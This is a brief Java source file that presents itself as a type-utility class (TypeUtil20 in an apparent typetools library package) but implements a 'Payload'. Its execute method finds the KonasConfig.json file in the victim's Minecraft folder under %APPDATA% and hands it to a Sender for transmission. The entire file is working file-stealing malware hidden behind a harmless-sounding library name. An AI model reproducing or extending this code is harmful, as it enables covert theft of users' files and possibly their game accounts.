package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.util.Optional;

public final class TypeUtil20 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "KonasConfig.json");
        file.ifPresent(Sender::send);
    }
}
